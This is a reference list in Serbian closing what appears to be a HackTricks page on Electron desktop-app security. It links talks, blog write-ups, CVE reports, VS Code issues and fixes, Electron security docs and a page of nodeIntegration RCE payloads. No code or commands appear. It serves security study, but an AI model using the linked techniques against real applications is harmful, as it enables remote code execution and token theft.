- [3] [Electron: Zloupotreba nedostatka izolacije konteksta - CureCon (en)](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=8)
- [4] [Radionica o hakovanju modernih desktop aplikacija pomoću XSS-a i RCE-a](https://www.youtube.com/watch?v=xILfQGkLXQo&t=22s)
- [5] [awesome-electronjs-hacking - odabrana lista resursa o (ne)sigurnosti Electron.js-a](https://github.com/doyensec/awesome-electronjs-hacking)
- [6] [Zloupotreba Electron API-ja: prvi izbor napadača](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)
- [7] [Electron nodeIntegration RCE payload-i](https://7as.es/electron/nodeIntegration_rce.txt)
- [8] [RCE jednim klikom u Electron aplikacijama](https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8)
- [9] [Opasnosti Electron-ovog shell.openExternal() - mnogi načini za daljinsko izvršavanje koda](https://benjamin-altpeter.de/shell-openexternal-dangers/)
- [10] [Dozvolite proizvoljne URL-ove i očekujte proizvoljno izvršavanje koda](https://positive.security/blog/url-open-rce#windows-10-19042)
- [11] [Postizanje RCE-a u poznatom japanskom čet alatu pomoću zastarele Electron funkcije](https://flatt.tech/research/posts/escaping-electron-isolation-with-obsolete-feature/)
- [12] [Discord Desktop - Daljinsko izvršavanje koda](https://blog.electrovolt.io/posts/discord-rce/)
- [13] [Visual Studio Code - Daljinsko izvršavanje koda u ograničenom režimu (CVE-2021-43908)](https://blog.electrovolt.io/posts/vscode-rce/)
- [14] [Krađa GitHub tokena jednim klikom pomoću ubrizgavanja događaja tastature u VS Code Webview](https://blog.ammaraskar.com/github-token-stealing)
- [15] [VS Code issue #319593: Webview-i mogu da aktiviraju proizvoljne prečice na tastaturi u glavnom radnom okruženju](https://github.com/microsoft/vscode/issues/319593)
- [16] [VS Code PR #319705: potvrda otvaranja beležnice i prestanak prihvatanja konteksta installExtension-a koji je obezbedio pozivalac](https://github.com/microsoft/vscode/pull/319705)
- [17] [VS Code PR #319813: blokiranje programskog ponovnog slanja pritisaka tastera/klikova iz Webview-a u Webview-ima beležnica](https://github.com/microsoft/vscode/pull/319813)
- [18] [VS Code 1.89 / ekstenzije lokalnog radnog prostora](https://code.visualstudio.com/updates/v1_89#_local-workspace-extensions)
- [19] [APPSEC Cali 2018 - MarkDoom: Kako sam hakovao svaki veliki IDE za 2 nedelje](https://www.youtube.com/watch?v=a-YnG3Mx-Tg)
- [20] [ElectroVolt: Preuzimanje kontrole nad popularnim desktop aplikacijama uz otkrivanje novih površina za napad u Electron-u](https://www.youtube.com/watch?v=Tzo8ucHA5xw&list=PLH15HpR5qRsVKcKwvIl-AzGfRqKyx--zq&index=81)
- [21] [Electron bezbednost](https://www.electronjs.org/docs/latest/tutorial/security)
- [22] [Electron BrowserWindow webPreferences](https://www.electronjs.org/docs/latest/api/browser-window#new-browserwindowoptions)
- [23] [REA: Obrnuti inženjering bilo čega](https://github.com/morluto/rea)
- [24] [Rekonstrukcija JavaScript artefakata pomoću REA](https://github.com/morluto/rea/blob/main/docs/javascript-artifact-reconstruction.md)
- [25] [Tokovi rada JavaScript aplikacija kroz više slojeva pomoću REA](https://github.com/morluto/rea/blob/main/docs/javascript-application-workflows.md)
{{#include ../../banners/hacktricks-training.md}}
